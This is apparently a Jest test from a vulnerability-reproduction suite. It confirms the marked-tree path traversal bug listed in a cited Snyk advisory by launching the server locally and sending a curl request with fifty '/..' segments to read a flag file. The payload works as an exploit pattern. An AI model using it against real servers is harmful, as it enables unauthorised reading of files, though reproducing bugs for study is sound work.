//https://snyk.io/vuln/SNYK-JS-MARKEDTREE-590121
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in marked-tree", (done) => {
  //const Server = require('marked-tree');
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");

  try{
    a.execSync('fuser -k 3500/tcp',()=>{})//killing any other process using the same port
  }catch(e){}

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:3500${genstr()}"`;
  let server = "node ./node_modules/marked-tree/index.js";

  exec(server, (error, stdout) => {
    exec(attack_string, (error, stdout) => {
      expect(stdout).toBe(hostsFile);
      //srv.stop(); // without stopping the server, Jest hangs
      done();
    });
  });
});
